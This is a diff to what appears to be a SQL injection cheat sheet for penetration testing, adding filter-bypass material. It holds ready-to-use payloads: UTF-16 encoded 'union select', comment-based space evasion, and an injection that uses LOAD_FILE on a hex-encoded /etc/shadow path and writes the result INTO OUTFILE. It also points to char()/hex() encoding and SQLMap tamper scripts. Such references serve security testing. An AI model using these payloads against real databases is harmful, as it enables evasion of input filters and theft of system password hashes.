@@ -151,7 +151,9 @@ Columns | column_name FROM all_tab_columns
 > **SQL Injection Filter Bypass**
 
 UTF-16 URL encoding for select and union:
+MySQL will map the most unicode characters
 %u0055Nion %u0053elect
+websec.github.io/unicode-security-guide/character-transformations/
 
 Spaces:
 union/**/select
@@ -159,7 +161,15 @@ union/**/select
 Escaping Escapted Quotes (Single and Double):
 {% highlight sql %}
 313372, pd_description = (select schema_name FROM information_schema.schemata limit 1,1 union select LOAD_FILE(0x002F6574632F736861646F77) INTO outfile QUOTE(test.txt) limit 1,1), pd_description=QUOTE(1)
+
+select 0x002F6574632F736861646F77
 {% endhighlight %}
+
+Functions:
+char() and hex()
+
+Try SQLMap tamper scripts
+
 
 > **SQL Injection Union**
 
